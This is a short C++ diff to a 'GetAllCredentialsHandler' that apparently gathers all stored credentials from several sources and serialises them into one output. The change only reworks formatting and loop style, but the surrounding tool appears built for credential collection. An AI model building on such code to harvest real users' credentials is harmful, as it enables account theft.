@@ -14,12 +14,12 @@ GetAllCredentialsHandler::GetAllCredentialsHandler(std::unique_ptr<Event> operat
 
 std::wstring GetAllCredentialsHandler::format_source(const std::wstring& source)
 {
-	return source + L" Credentials:";
+	return std::wstring{L"[Credentials "} + source + L"]";
 }
 
-std::wstring GetAllCredentialsHandler::format_credential(const Credential& credential, const size_t index)
+std::wstring GetAllCredentialsHandler::format_credential(const Credential& credential)
 {
-	return Strings::concat(std::wstring(L"#"), Strings::to_wstring(index), std::wstring(L"\n"), credential.serialize());
+	return Strings::concat(std::wstring(L"#Credential"), std::wstring(L"\n"), credential.serialize());
 }
 
 void GetAllCredentialsHandler::run()
@@ -40,14 +40,13 @@ void GetAllCredentialsHandler::run()
 
 		if (credentials.has_value())
 		{
-			for (size_t i = 0; i < credentials->size(); ++i)
-			{
-				product.append(format_credential((*credentials)[i], i) + SUFFIX);
+			for (const Credential& credential : *credentials) {
+				product.append(format_credential(credential) + SUFFIX);
 			}
 		}
 		else
 		{
-			product.append(std::wstring{L"[Not Supported]"} + SUFFIX);
+			product.append(std::wstring{L"#Not Supported"} + SUFFIX);
 		}
 
 		product.append(SUFFIX);
